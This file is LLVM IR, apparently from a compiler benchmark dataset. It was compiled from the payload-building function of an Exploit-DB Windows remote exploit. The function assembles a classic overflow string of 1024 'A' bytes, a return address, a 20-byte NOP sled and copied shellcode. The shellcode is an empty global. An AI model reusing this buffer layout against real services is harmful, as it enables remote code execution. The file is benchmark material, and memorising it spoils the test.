; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/windows/remote/extr_23733.c_build.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/windows/remote/extr_23733.c_build.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@stdout = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [42 x i8] c"[+] Building evil string to send (0x%x).\0A\00", align 1
@SIZE = common dso_local global i64 0, align 8
@stderr = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [39 x i8] c"[-] Can't allocate memory, exiting...\0A\00", align 1
@shellcode = common dso_local global i32 0, align 4
@.str.2 = private unnamed_addr constant [5 x i8] c"%s\0D\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i8* @build(i64 %0) #0 {
  %2 = alloca i64, align 8
  %3 = alloca i8*, align 8
  %4 = alloca i8*, align 8
  %5 = alloca i8*, align 8
  %6 = alloca i32, align 4
  %7 = alloca i64*, align 8
  store i64 %0, i64* %2, align 8
  %8 = load i32, i32* @stdout, align 4
  %9 = load i64, i64* %2, align 8
  %10 = call i32 (i32, i8*, ...) @fprintf(i32 %8, i8* getelementptr inbounds ([42 x i8], [42 x i8]* @.str, i64 0, i64 0), i64 %9)
  %11 = load i64, i64* @SIZE, align 8
  %12 = call i64 @malloc(i64 %11)
  %13 = inttoptr i64 %12 to i8*
  store i8* %13, i8** %3, align 8
  %14 = load i64, i64* @SIZE, align 8
  %15 = add nsw i64 %14, 4
  %16 = call i64 @malloc(i64 %15)
  %17 = inttoptr i64 %16 to i8*
  store i8* %17, i8** %5, align 8
  %18 = load i8*, i8** %3, align 8
  %19 = icmp ne i8* %18, null
  br i1 %19, label %20, label %23

20:                                               ; preds = %1
  %21 = load i8*, i8** %5, align 8
  %22 = icmp ne i8* %21, null
  br i1 %22, label %27, label %23

23:                                               ; preds = %20, %1
  %24 = load i32, i32* @stderr, align 4
  %25 = call i32 (i32, i8*, ...) @fprintf(i32 %24, i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.1, i64 0, i64 0))
  %26 = call i32 @exit(i32 0) #3
  unreachable

27:                                               ; preds = %20
  %28 = load i8*, i8** %3, align 8
  store i8* %28, i8** %4, align 8
  %29 = load i8*, i8** %4, align 8
  %30 = call i32 @memset(i8* %29, i32 65, i32 1024)
  %31 = load i8*, i8** %4, align 8
  %32 = getelementptr inbounds i8, i8* %31, i64 1024
  store i8* %32, i8** %4, align 8
  %33 = load i8*, i8** %4, align 8
  %34 = bitcast i8* %33 to i64*
  store i64* %34, i64** %7, align 8
  %35 = load i64, i64* %2, align 8
  %36 = load i64*, i64** %7, align 8
  %37 = getelementptr inbounds i64, i64* %36, i32 1
  store i64* %37, i64** %7, align 8
  store i64 %35, i64* %36, align 8
  %38 = load i64*, i64** %7, align 8
  %39 = bitcast i64* %38 to i8*
  store i8* %39, i8** %4, align 8
  %40 = load i8*, i8** %4, align 8
  %41 = call i32 @memset(i8* %40, i32 144, i32 20)
  %42 = load i8*, i8** %4, align 8
  %43 = getelementptr inbounds i8, i8* %42, i64 20
  store i8* %43, i8** %4, align 8
  %44 = load i8*, i8** %4, align 8
  %45 = load i32, i32* @shellcode, align 4
  %46 = load i32, i32* @shellcode, align 4
  %47 = call i32 @strlen(i32 %46)
  %48 = call i32 @memcpy(i8* %44, i32 %45, i32 %47)
  %49 = load i32, i32* @shellcode, align 4
  %50 = call i32 @strlen(i32 %49)
  %51 = load i8*, i8** %4, align 8
  %52 = sext i32 %50 to i64
  %53 = getelementptr inbounds i8, i8* %51, i64 %52
  store i8* %53, i8** %4, align 8
  %54 = load i8*, i8** %5, align 8
  %55 = load i64, i64* @SIZE, align 8
  %56 = add nsw i64 %55, 64
  %57 = load i8*, i8** %3, align 8
  %58 = call i32 @snprintf(i8* %54, i64 %56, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.2, i64 0, i64 0), i8* %57)
  %59 = load i8*, i8** %5, align 8
  ret i8* %59
}

declare dso_local i32 @fprintf(i32, i8*, ...) #1

declare dso_local i64 @malloc(i64) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i32 @memset(i8*, i32, i32) #1

declare dso_local i32 @memcpy(i8*, i32, i32) #1

declare dso_local i32 @strlen(i32) #1

declare dso_local i32 @snprintf(i8*, i64, i8*, i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
